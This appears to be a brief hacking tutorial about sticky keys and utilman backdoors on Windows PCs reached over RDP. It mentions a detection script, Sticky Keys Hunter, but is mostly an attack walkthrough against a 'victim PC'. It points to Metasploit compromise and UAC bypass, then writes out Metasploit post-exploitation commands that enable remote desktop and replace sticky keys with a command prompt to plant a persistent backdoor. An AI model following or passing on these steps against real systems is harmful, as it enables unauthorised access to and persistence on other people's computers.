Access Sticky keys Backdoor on Remote PC with Sticky Keys Hunter

This bash script tests for sticky keys and utilman backdoors. The script will connect to an RDP server; send both the sticky keys and utilman triggers and screenshot the result.
How does it work?
First Hack the Victim PC Using Metasploit (Tutorial How to Hack Remote PC)
Bypass the UAC Protection of Victim PC (Tutorial How to Bypass UAC Protection)
After getting the session enable the remote desktop option of remote pc using following exploit
msf > use post/windows/manage/enable_rdp
msf post(enable_rdp) > set session 2
msf post(enable_rdp) > exploit

In Next step replace the sticke key with command prompt using following exploit
msf > use post/windows/manage/stickey_keys
msf post(stickey_keys) > set session 2
msf post(stickey_keys) > exploit

Now clone Sticky Keys Hunter repository from github, to do so type:
git clone https://github.com/ztgrace/sticky_keys_hunter.git

For scan a single host: ./stickyKeysHunter.sh 192.168.0.120
